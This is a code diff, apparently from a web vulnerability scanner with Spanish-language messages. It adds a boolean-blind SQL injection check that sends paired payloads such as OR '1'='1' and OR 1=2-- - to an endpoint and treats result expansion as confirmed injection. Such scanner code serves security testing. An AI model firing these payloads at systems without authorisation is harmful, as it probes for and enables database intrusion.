@@ -3943,6 +3943,43 @@ def verify_generic_sqli_blind(
                     return None
 
             _ctrl_len = _bool_send(orig_value)
+
+            # Empty-response expansion check: control returned [] / {} / empty JSON (≤5B).
+            # In this mode TRUE (OR 1=1) should expand results; FALSE (OR 1=2) keeps empty.
+            # Only meaningful for OR injection (AND would keep the empty set empty either way).
+            if _ctrl_len is not None and _ctrl_len <= 5:
+                _exp_or_pairs = [
+                    (f"{orig_value}' OR '1'='1", f"{orig_value}' OR '1'='2"),
+                    (f"{orig_value} OR 1=1", f"{orig_value} OR 1=2"),
+                    (f"{orig_value}\" OR \"1\"=\"1", f"{orig_value}\" OR \"1\"=\"2"),
+                    (f"{orig_value}' OR 1=1-- -", f"{orig_value}' OR 1=2-- -"),
+                    (f"{orig_value} OR 1=1-- -", f"{orig_value} OR 1=2-- -"),
+                ]
+                for _exp_t, _exp_f in _exp_or_pairs:
+                    _t_len = _bool_send(_exp_t)
+                    _f_len = _bool_send(_exp_f)
+                    if (_t_len is not None and _f_len is not None
+                            and _t_len > 10 and _f_len <= 10
+                            and _t_len >= 20):
+                        res.verified = True
+                        res.ok = True
+                        res.confidence = "probable"
+                        res.evidence.update({
+                            "tecnica": "boolean-blind-empty-expansion",
+                            "sqli_param": sqli_param, "metodo": m,
+                            "endpoint": endpoint_path,
+                            "true_payload": _exp_t, "false_payload": _exp_f,
+                            "len_true": _t_len, "len_false": _f_len,
+                            "len_control": _ctrl_len,
+                        })
+                        res.detail = (
+                            f"SQLI CONFIRMADO (boolean-blind OR-expansion): "
+                            f"OR 1=1 retorno {_t_len}B, OR 1=2 retorno {_f_len}B "
+                            f"(control={_ctrl_len}B) — resultados se expanden con OR 1=1"
+                        )
+                        step(f"VERIFICADO empty-expansion: TRUE={_t_len}B FALSE={_f_len}B ctrl={_ctrl_len}B")
+                        return res
+
             if _ctrl_len is not None and _ctrl_len > 5:
                 # Adaptive threshold: 5% of control response or minimum 8B for small responses.
                 _bool_threshold = max(8, int(_ctrl_len * 0.05))
